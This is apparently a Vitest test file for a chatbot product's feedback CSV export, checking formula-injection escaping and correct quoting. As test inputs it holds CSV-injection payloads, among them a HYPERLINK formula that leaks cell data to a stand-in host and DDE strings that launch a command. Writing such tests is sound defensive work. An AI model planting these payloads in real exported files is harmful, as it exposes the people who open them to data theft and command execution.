/**
 * The feedback CSV export.
 *
 * Question and Answer are raw chat content — whatever a website visitor typed,
 * verbatim — so this is the second place (after the lead exports) where
 * untrusted text leaves the product as a file the customer opens in Excel. The
 * escape itself is unit-tested in `lib/csvSafe.test.ts`; these prove it is
 * wired into the file that actually gets downloaded, and pin the two data-
 * integrity bugs the previous implementation shipped.
 */
import { describe, expect, it } from 'vitest';

import { type FeedbackItem } from './types';

import { buildFeedbackCsv } from './feedback-helpers';

const TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;

function item(overrides: Partial<FeedbackItem> = {}): FeedbackItem {
  return {
    message_id: 1,
    created_at: '2026-08-13T10:00:00Z',
    question: 'How much does it cost?',
    answer: 'Plans start at 999 INR.',
    feedback: 1,
    user: 'User -3',
    ...overrides,
  };
}

/** Cells of one row, RFC-4180 unwrapped. Rows never contain a bare newline. */
function cells(csv: string, row: number): string[] {
  return (csv.split('\n')[row].match(/"(?:[^"]|"")*"/g) ?? []).map((cell) =>
    cell.slice(1, -1).replace(/""/g, '"'),
  );
}

describe('buildFeedbackCsv', () => {
  it('emits the documented header and one row per item', () => {
    const csv = buildFeedbackCsv([item(), item({ message_id: 2, feedback: -1 })]);

    expect(cells(csv, 0)).toEqual(['Date', 'User', 'Type', 'Question', 'Answer']);
    expect(csv.split('\n')).toHaveLength(3);
    expect(cells(csv, 1)[2]).toBe('Positive');
    expect(cells(csv, 2)[2]).toBe('Negative');
  });

  it('returns a header-only file for an empty log', () => {
    /* The button is clickable with the filters showing nothing; a valid
       header-only CSV is the honest answer, not a malformed file. */
    const csv = buildFeedbackCsv([]);

    expect(csv.split('\n')).toHaveLength(1);
    expect(cells(csv, 0)).toEqual(['Date', 'User', 'Type', 'Question', 'Answer']);
  });
});

describe('buildFeedbackCsv — CSV injection', () => {
  it.each([
    ['=HYPERLINK("https://evil.test/?"&A1,"Click")', 'formula'],
    ['+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ['-2+3+cmd|" /C calc"!A0', 'signed expression / DDE'],
    ["@SUM(1+1)*cmd|' /C calc'!A0", 'legacy Lotus-style formula'],
    ['\t=1+1', 'TAB-prefixed formula'],
  ])('neutralises %j in a visitor question (%s)', (payload) => {
    /* The realistic vector: a visitor types this into the chat widget, the
       customer later exports their feedback log and opens it in Excel. */
    const csv = buildFeedbackCsv([item({ question: payload })]);

    const question = cells(csv, 1)[3];
    expect(question).toBe(`'${payload}`);
    expect(TRIGGERS.some((t) => question.startsWith(t))).toBe(false);
    // Defused, not dropped — the question stays readable.
    expect(question.slice(1)).toBe(payload);
  });

  it('neutralises a payload in every column', () => {
    /* A sweep over the columns as they exist today. What keeps a *future*
       column safe is the shared `csvField` funnel, not this test. */
    const csv = buildFeedbackCsv([
      item({
        user: '=1+1',
        question: '@SUM(1+1)',
        answer: '+cmd|" /C calc"!A0',
      }),
    ]);

    for (const cell of [...cells(csv, 0), ...cells(csv, 1)]) {
      expect(TRIGGERS.some((t) => cell.startsWith(t))).toBe(false);
    }
  });

  it('escapes a CR-prefixed answer', () => {
    /* CR is stripped by Excel before it decides whether the cell is a formula,
       so a check that only looks for '=' would miss this one. */
    const csv = buildFeedbackCsv([item({ answer: '\r=1+1' })]);

    expect(csv).toContain('"\'\r=1+1"');
    expect(csv).not.toContain('"\r=1+1"');
  });

  it('leaves ordinary content alone', () => {
    /* No stray quotes on real data — the escape is targeted at the leading
       character and nothing else. */
    const csv = buildFeedbackCsv([item()]);
    const row = cells(csv, 1);

    expect(row[1]).toBe('User -3');
    expect(row[3]).toBe('How much does it cost?');
    expect(row[4]).toBe('Plans start at 999 INR.');
  });
});

describe('buildFeedbackCsv — data integrity', () => {
  it('keeps commas in the data instead of deleting them', () => {
    /* Regression: the previous implementation ran `.replace(/,/g, '')` over
       user, question and answer before quoting them. Quoting is what makes a
       comma safe; stripping it silently corrupted the export — and this is a
       one-way door, since the CSV is where the data leaves the product. */
    const csv = buildFeedbackCsv([
      item({
        question: 'Do you support Hindi, Marathi, and Tamil?',
        answer: 'Yes, all three.',
      }),
    ]);

    const row = cells(csv, 1);
    expect(row[3]).toBe('Do you support Hindi, Marathi, and Tamil?');
    expect(row[4]).toBe('Yes, all three.');
    // Still parses as 5 fields — the commas are inside quoted cells.
    expect(row).toHaveLength(5);
  });

  it('doubles embedded quotes in every column, including User', () => {
    /* Regression: `user` was comma-stripped but never quote-escaped, unlike
       the other columns — a quote in it broke the row apart for the parser. */
    const csv = buildFeedbackCsv([
      item({ user: 'User "3"', question: 'What is "RAG"?', answer: 'Retrieval-"augmented".' }),
    ]);

    const row = cells(csv, 1);
    expect(row[1]).toBe('User "3"');
    expect(row[3]).toBe('What is "RAG"?');
    expect(row[4]).toBe('Retrieval-"augmented".');
    expect(row).toHaveLength(5);
  });
});
